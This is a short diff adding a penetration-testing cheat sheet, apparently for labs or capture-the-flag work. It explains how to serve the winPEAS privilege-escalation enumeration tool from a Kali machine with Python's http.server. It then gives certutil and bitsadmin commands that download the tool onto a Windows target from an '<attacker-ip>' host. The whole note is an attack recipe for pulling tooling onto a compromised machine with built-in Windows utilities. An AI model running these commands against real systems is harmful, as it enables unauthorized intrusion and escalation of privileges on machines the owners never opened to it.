@@ -1,1 +1,12 @@
+How to serve winpeas
 
+From directory containing winpeas
+root@kali$ python3 -m http.server 80
+
+On host machine
+
+Works on newer machines
+certutil -urlcache -split -f http://<attacker-ip>/winPEASx64.exe winpeas.exe
+
+Works on older machines
+bitsadmin /transfer winpeastask /download /priority high http://<attacker-ip>/winPEASx64.exe C:\Users\Public\winpeas.exe
